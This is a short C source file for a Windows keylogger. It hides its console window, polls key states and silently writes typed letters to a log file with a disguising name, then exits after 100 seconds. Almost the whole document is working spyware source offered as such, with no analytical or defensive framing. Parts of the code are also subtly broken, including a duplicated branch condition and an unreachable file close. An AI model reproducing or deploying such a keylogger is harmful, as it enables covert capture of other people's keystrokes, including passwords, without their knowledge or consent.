// KeyLogger for Windows machine

// https://www.ascii-code.com/fr

#include <stdio.h>
#include <windows.h>
#include <time.h>

// We'll write all the keypresses into a file
#define LOGFILE "totallyfriendlyfile.txt"

void windows_keylog() {
    // We'll start the timer
    time_t start = time(NULL);

    FILE *file;
    file = fopen(LOGFILE, "w");
    if (file == NULL) {
        return;
    }
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char key;
    while (1) {
        if (time(NULL) - start > 100) {
            printf("Ending keylogger program...\n");
            exit(0);
        }
        Sleep(10);
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
                    key += 32;
                    fputc(key, file);
                    fflush(file);
                } else if ((key > 64) && (key < 91)) {
                    fputc(key, file);
                    fflush(file);
                } else if ((key > 64) && (key < 91)) {
                    fputc(key, file);
                    fflush(file);
                } else {
                    continue;
                }
            }
        }
    }
    fclose(file);
}
